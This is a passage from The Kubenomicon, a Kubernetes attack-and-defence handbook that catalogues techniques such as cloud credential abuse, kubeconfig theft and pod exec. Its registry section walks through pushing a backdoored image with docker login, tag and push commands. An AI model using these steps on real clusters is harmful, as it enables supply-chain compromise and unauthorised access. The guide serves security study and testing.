<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>The Kubenomicon</title>
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <base href="">

        <link rel="stylesheet" href="book.css">
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel="stylesheet" type="text/css">

        <link rel="shortcut icon" href="favicon.png">

        <!-- Font Awesome -->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">

        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme -->
        

        

        <!-- Fetch Clipboard.js from CDN but have a local fallback -->
        <script src="https://cdn.jsdelivr.net/clipboard.js/1.6.1/clipboard.min.js"></script>
        <script>
            if (typeof Clipboard == 'undefined') {
                document.write(unescape("%3Cscript src='clipboard.min.js'%3E%3C/script%3E"));
            }
        </script>

        <!-- Fetch JQuery from CDN but have a local fallback -->
        <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
        <script>
            if (typeof jQuery == 'undefined') {
                document.write(unescape("%3Cscript src='jquery.js'%3E%3C/script%3E"));
            }
        </script>

        <!-- Fetch store.js from local - TODO add CDN when 2.x.x is available on cdnjs -->
        <script src="store.js"></script>

    </head>
    <body class="light">
        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme = store.get('mdbook-theme');
            if (theme === null || theme === undefined) { theme = 'light'; }
            $('body').removeClass().addClass(theme);
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var sidebar = store.get('mdbook-sidebar');
            if (sidebar === "hidden") { $("html").addClass("sidebar-hidden") }
            else if (sidebar === "visible") { $("html").addClass("sidebar-visible") }
        </script>

        <div id="sidebar" class="sidebar">
            <ul class="chapter"><li class="affix"><a href="./Kubenomicon.html">Home - Kubenomicon</a></li><li><a href="Initial_access.html"><strong>1.</strong> Initial access</a></li><li><ul class="section"><li><a href="Initial_access/Using_cloud_credentials.html"><strong>1.1.</strong> Using cloud credentials</a></li><li><a href="Initial_access/Compromised_image_in_registry.html"><strong>1.2.</strong> Compromised image In registry</a></li><li><a href="Initial_access/Kubeconfig_file.html"><strong>1.3.</strong> Kubeconfig file</a></li><li><a href="Initial_access/Application_vulnerability.html"><strong>1.4.</strong> Application vulnerability</a></li><li><a href="Initial_access/Exposed_sensitive_interfaces.html"><strong>1.5.</strong> Exposed sensitive interfaces</a></li><li><a href="./Initial_access/SSH_server_running_inside_container.html"><strong>1.6.</strong> SSH server running inside container</a></li></ul></li><li><a href="Execution.html"><strong>2.</strong> Execution</a></li><li><ul class="section"><li><a href="Execution/Exec_inside_container.html"><strong>2.1.</strong> Exec inside container</a></li><li><a href="Execution/New_container.html"><strong>2.2.</strong> New container</a></li><li><a href="./Execution/Application_exploit.html"><strong>2.3.</strong> Application exploit (RCE) üîó</a></li><li><a href="Execution/Sidecar_injection.html"><strong>2.4.</strong> Sidecar injection</a></li></ul></li><li><a href="Persistence.html"><strong>3.</strong> Persistence</a></li><li><ul class="section"><li><a href="Persistence/Backdoor_container.html"><strong>3.1.</strong> Backdoor container</a></li><li><a href="Persistence/Writable_hostPath_mount.html"><strong>3.2.</strong> Writable hostPath mount</a></li><li><a href="Persistence/Kubernetes_cronjob.html"><strong>3.3.</strong> Kubernetes cronjob</a></li><li><a href="Persistence/Malicious_admission_controller.html"><strong>3.4.</strong> Malicious admission controller</a></li><li><a href="Persistence/Container_service_account.html"><strong>3.5.</strong> Container service account üîó</a></li><li><a href="Persistence/Static_pods.html"><strong>3.6.</strong> Static pods</a></li></ul></li><li><a href="Privilege_escalation.html"><strong>4.</strong> Privilege escalation</a></li><li><ul class="section"><li><a href="Privilege_escalation/Privileged_container.html"><strong>4.1.</strong> Privileged container</a></li><li><a href="Privilege_escalation/Cluster-admin_binding.html"><strong>4.2.</strong> Cluster-admin binding</a></li><li><a href="Privilege_escalation/hostPath_mount.html"><strong>4.3.</strong> hostPath mount üîó</a></li><li><a href="Privilege_escalation/Access_cloud_resources.html"><strong>4.4.</strong> Access cloud resources üîó</a></li></ul></li><li><a href="Defense_evasion.html"><strong>5.</strong> Defense evasion</a></li><li><ul class="section"><li><a href="Defense_evasion/Clear_container_logs.html"><strong>5.1.</strong> Clear container logs</a></li><li><a href="Defense_evasion/Delete_events.html"><strong>5.2.</strong> Delete events</a></li><li><a href="Defense_evasion/Pod_name_similarity.html"><strong>5.3.</strong> Pod name similarity</a></li><li><a href="Defense_evasion/Connect_from_proxy_server.html"><strong>5.4.</strong> Connect from proxy server</a></li></ul></li><li><a href="Credential_access.html"><strong>6.</strong> Credential access</a></li><li><ul class="section"><li><a href="Credential_access/List_K8S_secrets.html"><strong>6.1.</strong> List K8S secrets</a></li><li><a href="Credential_access/Access_node_information.html"><strong>6.2.</strong> Access node information</a></li><li><a href="Credential_access/Container_service_account.html"><strong>6.3.</strong> Container service account</a></li><li><a href="Credential_access/Application_credentials_in_configuration_files.html"><strong>6.4.</strong> Application credentials in configuration files</a></li><li><a href="Credential_access/Access_managed_identity_credentials.html"><strong>6.5.</strong> Access managed identity credentials</a></li><li><a href="Credential_access/Malicious_admission_controller.html"><strong>6.6.</strong> Malicious admission controller üîó</a></li></ul></li><li><a href="Discovery.html"><strong>7.</strong> Discovery</a></li><li><ul class="section"><li><a href="Discovery/Access_kubernetes_API_server.html"><strong>7.1.</strong> Access Kubernetes API server</a></li><li><a href="Discovery/Access_kubelet_API.html"><strong>7.2.</strong> Access Kubelet API</a></li><li><a href="Discovery/Network_mapping.html"><strong>7.3.</strong> Network mapping</a></li><li><a href="Discovery/Exposed_sensitive_interfaces.html"><strong>7.4.</strong> Exposed sensitive interfaces üîó</a></li><li><a href="Discovery/Instance_metadata_API.html"><strong>7.5.</strong> Instance Metadata API üîó</a></li></ul></li><li><a href="Lateral_movement.html"><strong>8.</strong> Lateral movement</a></li><li><ul class="section"><li><a href="Lateral_movement/Access_cloud_resources.html"><strong>8.1.</strong> Access cloud resources üîó</a></li><li><a href="Lateral_movement/Container_service_account.html"><strong>8.2.</strong> Container service account üîó</a></li><li><a href="Lateral_movement/Cluster_internal_networking.html"><strong>8.3.</strong> Cluster internal networking</a></li><li><a href="Lateral_movement/Application_credentials_in_configuration_files.html"><strong>8.4.</strong> Application credentials in configuration files üîó</a></li><li><a href="Lateral_movement/Writable_hostPath_mount.html"><strong>8.5.</strong> Writable hostPath mount üîó</a></li><li><a href="Lateral_movement/CoreDNS_poisoning.html"><strong>8.6.</strong> CoreDNS poisoning</a></li><li><a href="Lateral_movement/ARP_poisoning_and_IP_spoofing.html"><strong>8.7.</strong> ARP poisoning and IP spoofing</a></li></ul></li><li><a href="Collection.html"><strong>9.</strong> Collection</a></li><li><ul class="section"><li><a href="Collection/Images_from_a_private_registry.html"><strong>9.1.</strong> Images from a private registry</a></li><li><a href="Collection/Collecting_data_from_pod.html"><strong>9.2.</strong> Collecting data from pod</a></li></ul></li><li><a href="Impact.html"><strong>10.</strong> Impact</a></li><li><ul class="section"><li><a href="Impact/Data_destruction.html"><strong>10.1.</strong> Data destruction</a></li><li><a href="Impact/Resource_hijacking.html"><strong>10.2.</strong> Resource hijacking</a></li><li><a href="Impact/Denial_of_service.html"><strong>10.3.</strong> Denial of service</a></li></ul></li><li><a href="./Fundamentals.html"><strong>11.</strong> Fundamentals</a></li><li><ul class="section"><li><a href="./Fundamentals/Nodes.html"><strong>11.1.</strong> Nodes</a></li><li><a href="./Fundamentals/Services.html"><strong>11.2.</strong> Services</a></li><li><a href="./Fundamentals/etcd.html"><strong>11.3.</strong> etcd</a></li><li><a href="./Fundamentals/RBAC.html"><strong>11.4.</strong> RBAC</a></li><li><a href="./Fundamentals/Kubelet.html"><strong>11.5.</strong> Kubelet</a></li><li><a href="./Fundamentals/Namespaces.html"><strong>11.6.</strong> Namespaces</a></li><li><a href="./Fundamentals/Secrets.html"><strong>11.7.</strong> Secrets</a></li><li><a href="./Fundamentals/Interesting_files.html"><strong>11.8.</strong> Interesting Files</a></li></ul></li><li><a href="./Contributing.html">Contributing</a></li><li class="affix"><a href="Pentesting%20Kubernetes.html">Pentesting Kubernetes</a></li></ul>
        </div>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page" tabindex="-1">
                
                <div id="menu-bar" class="menu-bar">
                    <div class="left-buttons">
                        <i id="sidebar-toggle" class="fa fa-bars" title="Toggle sidebar"></i>
                        <i id="theme-toggle" class="fa fa-paint-brush" title="Change theme"></i>
                    </div>

                    <h1 class="menu-title">The Kubenomicon</h1>

                    <div class="right-buttons">
                        <a href="print.html">
                            <i id="print-button" class="fa fa-print" title="Print this book"></i>
                        </a>
                    </div>
                </div>

                <div id="content" class="content">
                    <a class="header" href="print.html#what-is-the-kubenomicon" id="what-is-the-kubenomicon"><h1>What is The Kubenomicon?</h1></a>
<p><img src="../images/kubenomicon_cropped.png" alt="" /></p>
<p>The Kubenomicon was born of a desire to understand more about Kubernetes from an offensive perspective. I found many great resources to aid in my journey, but I quickly realized:</p>
<ol>
<li>I will never be able to solely document every offensive and defensive Kubernetes technique on my own.</li>
<li>Things in the Kubernetes world <a href="https://kubernetes.io/releases/release/">move really fast</a> and there are constantly new attack surfaces to explore.
My solution to this is to start the Kubenomicon -- a place where offensive security techniques and how to defend against them can easily be documented via pull requests to the Kubenomicon GitHub.</li>
</ol>
<p>This project was heavily inspired by the <a href="https://microsoft.github.io/Threat-Matrix-for-Kubernetes/">Kubernetes Threat Matrix</a> from Microsoft which is a great starting point as it provides a framework to help understand some of the concepts in a <a href="https://attack.mitre.org/">MITRE ATTACK</a> style framework. The Microsoft Threat Matrix was explicitly not designed to be a playbook offensive for security professionals and thus it lacks the details necessary to actually exploit (and remediate) each attack in Kubernetes cluster.</p>
<a class="header" href="print.html#the-kubenomicon-threat-matrix" id="the-kubenomicon-threat-matrix"><h1>The Kubenomicon Threat Matrix</h1></a>
<table><thead><tr><th> <a href="Initial_access.md">Initial Access</a>                                                            </th><th> <a href="Execution.md">Execution</a>                                       </th><th> <a href="Persistence.md">Persistence</a>                                                     </th><th> <a href="Privilege_escalation.md">Privilege Escalation</a>                            </th><th> <a href="Defense_evasion.md">Defense Evasion</a>                                       </th><th> <a href="Credential_access.md">Credential Access</a>                                                                               </th><th> <a href="Discovery.md">Discovery</a>                                                   </th><th> <a href="Lateral_movement.md">Lateral Movement</a>                                                                                </th><th> <a href="Collection.md">Collection</a>                                                      </th><th> <a href="Impact.md">Impact</a>                                  </th></tr></thead><tbody>
<tr><td> <a href="./Initial_access/Using_cloud_credentials.md">Using Cloud Credentials</a>                         </td><td> <a href="./Execution/Exec_inside_container.md">Exec inside container</a>   </td><td> <a href="./Persistence/Backdoor_container.md">Backdoor Container</a>                         </td><td> <a href="./Privilege_escalation/Privileged_container.md">Privileged Container</a>     </td><td> <a href="./Defense_evasion/Clear_container_logs.md">Clear Container Logs</a>           </td><td> <a href="./Credential_access/List_K8S_secrets.md">List K8S secrets</a>                                                             </td><td> <a href="./Discovery/Access_kubernetes_API_server.md">Access Kubernetes API Server</a> </td><td> <a href="./Lateral_movement/Access_cloud_resources.md">Access Cloud Resources</a>                                                 </td><td> <a href="./Collection/Images_from_a_private_registry.md">Images from a private registry</a> </td><td> <a href="./Impact/Data_destruction.md">Data Destruction</a>     </td></tr>
<tr><td> <a href="./Initial_access/Compromised_image_in_registry.md">Compromised image in registry</a>             </td><td> <a href="./Execution/New_container.md">New Container</a>                   </td><td> <a href="./Persistence/Writable_hostPath_mount.md">Writable hostPath mount</a>               </td><td> <a href="./Privilege_escalation/Cluster-admin_binding.md">Cluster-admin binding</a>   </td><td> <a href="./Defense_evasion/Delete_events.md">Delete Events</a>                         </td><td> <a href="./Credential_access/Access_node_information.md">Access Node Information</a>                                               </td><td> <a href="./Discovery/Access_kubelet_API.md">Access Kubelet API</a>                     </td><td> <a href="./Lateral_movement/Container_service_account.md">Container Service Account</a>                                           </td><td> <a href="./Collection/Collecting_data_from_pod.md">Collecting Data From Pod</a>             </td><td> <a href="./Impact/Resource_hijacking.md">Resource Hijacking</a> </td></tr>
<tr><td> <a href="./Initial_access/Kubeconfig_file.md">Kubeconfig File</a>                                         </td><td> <a href="./Execution/Application_exploit.md">Application Exploit (RCE)</a> </td><td> <a href="./Persistence/Kubernetes_cronjob.md">Kubernetes Cronjob</a>                         </td><td> <a href="./Privilege_escalation/hostPath_mount.md">hostPath Mount</a>                 </td><td> <a href="./Defense_evasion/Pod_name_similarity.md">Pod Name Similarity</a>             </td><td> <a href="./Credential_access/Container_service_account.md">Container Service Account</a>                                           </td><td> <a href="./Discovery/Network_mapping.md">Network Mapping</a>                           </td><td> <a href="./Lateral_movement/Cluster_internal_networking.md">Cluster Internal Networking</a>                                       </td><td>                                                                                  </td><td> <a href="./Impact/Denial_of_service.md">Denial of Service</a>   </td></tr>
<tr><td> <a href="./Initial_access/Application_vulnerability.md">Application Vulnerability</a>                     </td><td> <a href="./Execution/Sidecar_injection.md">Sidecar Injection</a>           </td><td> <a href="./Persistence/Malicious_admission_controller.md">Malicious Admission Controller</a> </td><td> <a href="./Privilege_escalation/Access_cloud_resources.md">Access Cloud Resources</a> </td><td> <a href="./Defense_evasion/Connect_from_proxy_server.md">Connect From Proxy Server</a> </td><td> <a href="./Credential_access/Application_credentials_in_configuration_files.md">Application Credentials In Configuration Files</a> </td><td> <a href="./Discovery/Exposed_sensitive_interfaces.md">Exposed Sensitive Interfaces</a> </td><td> <a href="./Lateral_movement/Application_credentials_in_configuration_files.md">Application Credentials In Configuration Files</a> </td><td>                                                                                  </td><td>                                                      </td></tr>
<tr><td> <a href="./Initial_access/Exposed_sensitive_interfaces.md">Exposed Sensitive Interfaces</a>               </td><td>                                                                 </td><td> <a href="./Persistence/Container_service_account.md">Container Service Account</a>           </td><td>                                                                            </td><td>                                                                             </td><td> <a href="./Credential_access/Access_managed_identity_credentials.md">Access Managed Identity Credentials</a>                       </td><td> <a href="./Discovery/Instance_metadata_API.md">Instance Metadata API</a>               </td><td> <a href="./Lateral_movement/Writable_hostPath_mount.md">Writable hostpath Mount</a>                                               </td><td>                                                                                  </td><td>                                                      </td></tr>
<tr><td> <a href="./Initial_access/SSH_server_running_inside_container.md">SSH server running inside container</a> </td><td>                                                                 </td><td> <a href="./Persistence/Static_pods.md">Static Pods</a>                                       </td><td>                                                                            </td><td>                                                                             </td><td> <a href="./Credential_access/Malicious_admission_controller.md">Malicious Admission Controller</a>                                 </td><td>                                                                             </td><td> <a href="./Lateral_movement/CoreDNS_poisoning.md">CoreDNS Poisoning</a>                                                           </td><td>                                                                                  </td><td>                                                      </td></tr>
<tr><td>                                                                                                </td><td>                                                                 </td><td>                                                                                   </td><td>                                                                            </td><td>                                                                             </td><td>                                                                                                                         </td><td>                                                                             </td><td> <a href="./Lateral_movement/ARP_poisoning_and_IP_spoofing.md">ARP Poisoning and IP Spoofing</a>                                   </td><td>                                                                                  </td><td>                                                      </td></tr>
</tbody></table>
<a class="header" href="print.html#prior-work" id="prior-work"><h1>Prior work</h1></a>
<p>I am far from the first person to come up with the idea to document this information. Many great projects exist that take a similar approach to this. Most notably what inspired this project was the <a href="https://microsoft.github.io/Threat-Matrix-for-Kubernetes/">Microsoft Kubernetes Threat Matrix</a>. Additionally, late into putting this project together I discovered this amazing <a href="https://kubernetes-threat-matrix.redguard.ch/">Threat matrix from RedGuard</a>. Some other projects that served as inspiration for this include:</p>
<ul>
<li><a href="https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security">Kubernetes Hacktricks</a></li>
</ul>
<a class="header" href="print.html#initial-access" id="initial-access"><h1>Initial access</h1></a>
<p>Initial Access into a Kubernetes cluster is usually the most difficult stage and for the most part, is not specific to Kubernetes and relies on one of the following:</p>
<ul>
<li>Finding a weakness in an application being hosted in a Kubernetes cluster
<ul>
<li><a href="./Initial_access/Application_vulnerability.md">Application Vulnerability</a></li>
</ul>
</li>
<li>Supply chain compromise
<ul>
<li><a href="./Initial_access/Compromised_image_in_registry.md">Compromised Images In Registry</a></li>
</ul>
</li>
<li>Abusing Developer Resources
<ul>
<li><a href="./Initial_access/Kubeconfig_file.md">Kubeconfig File</a></li>
<li><a href="./Initial_access/Exposed_sensitive_interfaces.md">Exposed Sensitive Interfaces</a></li>
<li><a href="./Initial_access/Using_cloud_credentials.md">Using Cloud Credentials</a></li>
</ul>
</li>
</ul>
<a class="header" href="print.html#using-cloud-credentials" id="using-cloud-credentials"><h1>Using Cloud Credentials</h1></a>
<p>Gaining access to the web application interface of managed Kubernetes services such as <a href="https://cloud.google.com/kubernetes-engine?hl=en">GKE</a>, <a href="https://azure.microsoft.com/en-us/products/kubernetes-service">AKS</a>, or <a href="https://aws.amazon.com/eks/">EKS</a> is extremely powerful. It should go without saying that if you're able to login to the management interface of a cloud provider, you can access the cluster and cause chaos. Typically this would be done via phishing.</p>
<p><img src="../images/Pasted-image-20240320232454.png" alt="" /></p>
<a class="header" href="print.html#defending" id="defending"><h1>Defending</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<a class="header" href="print.html#compromised-image-in-registry" id="compromised-image-in-registry"><h1>Compromised image In registry</h1></a>
<p>A compromised container image in a trusted registry can be used to gain initial access to a Kubernetes cluster if you're able to push images to it. This attack path is fundamentally the same concept as <a href="http://localhost:3000/Persistence/Backdoor_container.html">Persistence -&gt; Backdoor_container</a>.</p>
<p>A compromised image in a container registry is the logical next step to <a href="http://localhost:3000/Persistence/Backdoor_container.html">Persistence -&gt; Backdoor_container</a>. If an attacker is able to upload or tamper with the &quot;trusted&quot; images in a registry such as <a href="https://github.com/goharbor/harbor">Harbor</a>, they can fully control the environment the application is operating within. This is analogous downloading an ubuntu ISO that an attacker had tampered with and using it as your base operating system.</p>
<p><img src="Pasted%20image%2020240331200054.png" alt="" /></p>
<a class="header" href="print.html#attacking" id="attacking"><h1>Attacking</h1></a>
<p>This attack picks up where <a href="../Persistence/Backdoor_container.md">Persistence -&gt; Backdoor Container</a> left off. The prerequisites for this attack are:</p>
<ol>
<li>You are able to upload images to a container registry.</li>
<li>You know the container image name that will be pulled</li>
<li>You have created a backdoor image (see <a href="../Persistence/Backdoor_container.md">Persistence -&gt; Backdoor Container</a>)</li>
</ol>
<p>First, lets login to the container registry using <code>docker login &lt;registry_url&gt; -u &lt;username&gt;</code>. Next, ensure that your backdoored image is available by running <code>docker image ls | grep &lt;image_name&gt;</code>.</p>
<p>Now we have to <code>tag</code> the image. <code>docker tag &lt;image_to_tag&gt; &lt;registry_url&gt;/REPOSITORY/IMAGE_NAME</code></p>
<p>Finally, push the backdoored image by running <code>docker push &lt;registry_url&gt;/REPOSITORY/IMAGE_NAME</code>.</p>
<p><img src="../images/Pasted%20image%2020240404162125.png" alt="" /></p>
<p>After that, the image will be pushed to the container registry. Assuming the image is pulled by Kubernetes, your backdoored image will be deployed.</p>
<p><img src="../images/Pasted%20image%2020240404162845.png" alt="" /></p>
<a class="header" href="print.html#defending-1" id="defending-1"><h1>Defending</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<a class="header" href="print.html#kubeconfig-file" id="kubeconfig-file"><h1>Kubeconfig file</h1></a>
<p>The Kubeconfig file is a configuration file that contains all the information <code>kubectl</code> needs to access the cluster. This includes information such as where the API server is, which credentials to use to interact with it, default namespaces, etc. You can change which Kubeconfig file you're using by setting the <code>$KUBECONFIG</code> environment variable.</p>
<p>Should an attacker gain access to a Kubeconfig file, they can instruct Kubectl to use it to access the cluster. <code>export KUBECONFIG=/path/to/kubeconfig</code>. Note that this file is typically just called <code>config</code> and stored in <code>~/.kube/config</code> but these can be left in many different places so it's worth hunting for them.</p>
<p><img src="../images/2024-03-20_23-46.png" alt="" /></p>
<p>The following is an example of what a Kubeconfig YAML file looks like:</p>
<pre><code class="language-yaml">apiVersion: v1
# Holds information on how to access the cluster
clusters:
  - cluster:
  # The API server's public key. Does not need to be kept secret
      certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURCakNDQWU2Z0F3SUJBZ0lCQVRBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwdGFXNXAKYTNWaVpVTkJNQjRYRFRJek1EY3lOREU0TXpJMU1Gb1hEVE16TURjeU1qRTRNekkxTUZvd0ZURVRNQkVHQTFVRQpBeE1LYldsdWFXdDFZbVZEUVRDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTUFECitnZDVoUEk5VmorNFk3Q25ZcDRDTnZBVkpGNGE5eWVrYUhkbWJaN0Mzby8zZ0xNT29CWDFEdktMbFh0WVFxaXcKUEpuYk1LMFJFNGI2QzM5K3laN3V4aTdNZGllc2xHYmdPRitLNnMvb2xBOExHdnk4R3V6Zmk3T1RlaFRacFF6VAoraGFzaFlLNFRJYU5KNGtTOUN0dFd6VzJVa243cHNxNWpFa0l0eFpGdnpWblhwYVNPQVZVOEJRSm1rMzhQUXIxCm5nVzdJbkdiNFNQcGZOWVlrVURUOEVzWG10eElJdWU5ZmJ2aThPM0E1eTNFSVB0ZkJDdk45M3paUFRIK0RyVTkKRUduYkhqWlVlQ3hGa1E1QmtMMjVjcTh2UVoyZWhtb3d6a1Z1dVM3SGUyZTFUOHNuc01uanpwaGtoV2NMMDRiWApPTHhmYy8wRER0VVJEV0pYdnRNQ0F3RUFBYU5oTUY4d0RnWURWUjBQQVFIL0JBUURBZ0trTUIwR0ExVWRKUVFXCk1CUUdDQ3NHQVFVRkJ3TUNCZ2dyQmdFRkJRY0RBVEFQQmdOVkhSTUJBZjhFQlRBREFRSC9NQjBHQTFVZERnUVcKQkJTTDQyYkEydVdsWnVzSHFOYUdqd0RwM21CRHNqQU5CZ2txaGtpRzl3MEJBUXNGQUFPQ0FRRUFDVEZjc2FaaAp4bjVNZTI2bkN1VVNjSDEzbFhKSjFSOXJPLzNXRDE0cUZrMERET2ZMVkZBdkR1L0xWU2ZIVkF5N0dSYWJCOWNUCmVXNndDV3JhUy9aczFDYXVMOG8vTVdoWG9VWUtHc0IxNVE0R21VUzBLMXV4L2ZNUUlZczVUNUJmU0UrLzBsQ0EKL2hINWRVaDMraklSa1ZhVVZBbDFxL3VQR0dIRXlqWGNMdlp5TGVmSENTMlJWbFU5SS9xb2FkQTd2ZE5US3VTNwpYOUZhZjdNNUxMYXRzNldraWRXd3BrS3FDQ3Z2YlhNck85SmFobXhrbFZvamhYYUZTQkNuSWpaQUIzQ2JTSWNBClpRWFNBTVlaTWZBSUNEYTF3eW1jM1dXUUZQVlZ0NUpubHd3WWx3TlVpTk9GdUJqZUtMMTUvSDZyS3VRdktHbkcKMmdVRUphUFV4WS93U0E9PQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==
      # API Server Address
      server: https://192.168.59.101:8443
    name: dev-cluster
  - cluster:
      certificate-authority: /home/smores/.minikube/ca.crt
      extensions:
        - extension:
            last-update: Mon, 18 Mar 2024 14:44:21 EDT
            provider: minikube.sigs.k8s.io
            version: v1.30.1
          name: cluster_info
      server: https://192.168.49.2:8443
    name: minikube
# Which Cluster, user, and namespace to access by default
contexts:
  - context:
      cluster: minikube
      extensions:
        - extension:
            last-update: Mon, 18 Mar 2024 14:44:21 EDT
            provider: minikube.sigs.k8s.io
            version: v1.30.1
          name: context_info
      namespace: default
      user: minikube
    name: minikube
current-context: minikube
kind: Config
preferences: {}
users:
  # Which user to authenticate to the cluster as
  - name: minikube
    user:
    # Contains a cert for the user signed by the kubernetes CA. This IS sensitive. Sometimes a token is used instead (such as service accounts)
      client-certificate: /home/smores/.minikube/profiles/minikube/client.crt
      client-key: /home/smores/.minikube/profiles/minikube/client.key

</code></pre>
<p>You can utilize <a href="https://github.com/grahamhelton/dredge">Dredge</a> to search for Kubeconfig files.</p>
<p><img src="../images/Pasted%20image%2020240328224853.png" alt="" /></p>
<a class="header" href="print.html#switching-contexts" id="switching-contexts"><h1>Switching Contexts</h1></a>
<p>Kubeconfig files allow you to set multiple &quot;contexts&quot;. Each context may have different RBAC permissions. In the following example, the <code>admin</code> user has full admin permissions as denoted by the <code>kubectl auth can-i --list | head</code> command displaying all RBAC verbs for all resources (piped to head for brevity).</p>
<p>Upon switching to the <code>dev</code> context using <code>kubectl config use-context dev</code>, and re-running <code>kubectl auth can-i --list | head</code>, the RBAC permissions for the dev context are displayed which are far less permissive.
<img src="../images/Pasted%20image%2020240321123344.png" alt="" /></p>
<a class="header" href="print.html#defending-2" id="defending-2"><h1>Defending</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<a class="header" href="print.html#application-vulnerability" id="application-vulnerability"><h1>Application Vulnerability</h1></a>
<p>The &quot;code security&quot; is the code of the application being deployed into the cluster. Fundamentally this is not really a &quot;Kubernetes&quot; specific attack path. Attacking this layer is generally performing a web application penetration test in an application hosted in a Kubernetes cluster. From this layer, you're looking to identify any sort of web application vulnerability that will allow you to get a shell on within the application (or possibly <a href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html">SSRF</a>).</p>
<p>Typically <em>initial access</em> into a Kubernetes cluster from an external perspective relies on some sort of injection attack that allows an attacker to get a foothold. Getting a shell in an web application running in a Kubernetes cluster will drop you inside the Pod running the container the application is hosted in.</p>
<a class="header" href="print.html#defending-3" id="defending-3"><h1>Defending</h1></a>
<p>All of the standard application security best practices should be followed to ensure your applications are not vulnerable to these exploits in the first place. This field is generally referred to as application security. At a very high level, ensure that applications are not vulnerable to common attacks outline in the <a href="https://cheatsheetseries.owasp.org/IndexTopTen.html">OWASP Top 10</a>.</p>
<ol>
<li><strong>Pre-commit security</strong>
<ul>
<li>Perform continuous threat-modeling</li>
<li>Enforce Peer code reviews</li>
<li>IDE security plugins</li>
<li>Pre-commit hooks</li>
</ul>
</li>
<li><strong>Commit Security</strong>
<ul>
<li>Perform static application security testing (SAST)</li>
<li>Perform security unit testing</li>
<li>Understand supply chain/dependency risks</li>
</ul>
</li>
<li><strong>Pre-Production</strong>
<ul>
<li>Perform web application security testing</li>
</ul>
</li>
</ol>
<a class="header" href="print.html#exposed-sensitive-interfaces" id="exposed-sensitive-interfaces"><h1>Exposed Sensitive interfaces</h1></a>
<p>Some services deployed in a kubernetes cluster are meant to only be accessed by Kubenetes admins. Having them exposed and/or having weak credentials on them can allow an attacker to access them and gain controol over them. Depending on the service, this can allow the attacker to do many different things. <a href="https://www.microsoft.com/en-us/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/">Microsoft calls out the following as sensitive interfaces they've seen exploited</a>: Apache NiFi, Kubeflow, Argo Workflows, Weave Scope, and the Kubernetes dashboard.</p>
<p>This is essentially a management interface for kubernetes.</p>
<p><img src="../images/Pasted%20image%2020240328225334.png" alt="" /></p>
<a class="header" href="print.html#defending-4" id="defending-4"><h2>Defending</h2></a>
<p>Ensure the sensitive interfaces are not accessible by those who do not need them. A simple way to check is by running <code>kubectl get pods -A</code> and look for the dashboard.</p>
<p><img src="../images/Pasted%20image%2020240328225356.png" alt="" /></p>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<a class="header" href="print.html#ssh-server-running-inside-container" id="ssh-server-running-inside-container"><h1>SSH server running inside container</h1></a>
<a class="header" href="print.html#ssh-server-running-inside-container-1" id="ssh-server-running-inside-container-1"><h3>SSH Server running inside container</h3></a>
<p>You're not really supposed to run ssh inside of a container but it can easily be done. This is not Kubernetes specific. Attack path here is getting creds to the SSH server and sshing in.</p>
<a class="header" href="print.html#defense" id="defense"><h4>Defense</h4></a>
<p>Don't run SSH servers inside of containers and if you do make sure they're locked down just like any other SSH server should be.
Some information on <a href="https://goteleport.com/blog/ssh-vs-kubectl/">kubectl vs ssh</a></p>
<a class="header" href="print.html#defending-5" id="defending-5"><h1>Defending</h1></a>
<blockquote>
<p>Pull requests needed ‚ù§Ô∏è </p>
</blockquote>
<a class="header" href="print.html#execution" id="execution"><h1>Execution</h1></a>
<p>The execution tactic tracks how an attacker can run code inside of a cluster.</p>
<ul>
<li><a href="./Execution/Exec_inside_container.md">Exec inside container</a></li>
<li><a href="./Execution/New_container.md">New Container</a></li>
<li><a href="./Execution/Application_exploit.md">Application Exploit üîó</a></li>
<li><a href="./Execution/Sidecar_injection.md">Sidecar Injection</a></li>
</ul>
<a class="header" href="print.html#exec-inside-container" id="exec-inside-container"><h1>Exec Inside Container</h1></a>
<p>The ability to &quot;exec&quot; into a container on the cluster. This is a very powerful privilege that allows you to run arbitrary commands within a container. You can ask the API server if you're allowed to exec into pods with kubectl by running: <code>kubectl auth can-i create pods/exec</code>. If you're allowed to exec into pods, the response will be <code>yes</code>.  See <a href="RBAC.md">RBAC</a> for more information</p>
<p>Exec-ing into a pod is simple: <code>kubectl exec &lt;pod_name&gt; -- &lt;command_to_run&gt;</code>. There are a few things to know.</p>
<ol>
<li>The binary you're running must exist in the container. Containers that have been minimized using a tool such as <a href="https://github.com/slimtoolkit/slim">SlimToolkit</a> will only have binaries that are needed for the application to run. This can be frustrating for an attacker as you may need to bring any tooling you need to execute. If you're attacking a pod that doesn't seem to have anything inside it, you can try utilizing <a href="https://www.gnu.org/software/bash/manual/html_node/Bourne-Shell-Builtins.html">shell builtins</a> to execute some commands.
